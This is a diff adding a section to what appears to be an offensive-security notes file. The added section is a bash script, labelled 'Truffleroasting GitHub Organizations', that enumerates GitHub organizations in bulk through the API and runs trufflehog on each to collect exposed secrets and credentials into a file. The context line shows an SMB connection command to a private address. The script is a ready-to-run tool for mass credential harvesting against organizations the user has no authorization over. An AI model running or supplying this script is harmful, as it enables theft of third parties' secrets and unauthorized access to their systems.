@@ -966,3 +966,28 @@ func main() {
 ```
 open "smb://rosesecurity@10.9.11.105/"
 ```
+
+## Truffleroasting GitHub Organizations:
+
+```bash
+#!/usr/bin/env bash
+
+# Enumerate GitHub organizations for secrets and credentials
+PAT=<GitHub PAT>
+ID=1
+while [ $ID -lt 1000000 ]
+do 
+    curl -L \
+    -H "Accept: application/vnd.github+json" \
+    -H "Authorization: Bearer $PAT" \
+    -H "X-GitHub-Api-Version: 2022-11-28" \
+    -H "Per-Page: 100" \
+    "https://api.github.com/organizations?per_page=100&since=$ID" | jq -r .[].login >> orgs.txt
+    ID=$((ID + 10000))
+done
+
+# Read each line from orgs.txt and run trufflehog for each organization
+while read -r line; do
+    trufflehog github --concurrency=5 -j --org="$line" >> truffle_org.txt
+done < orgs.txt
+```
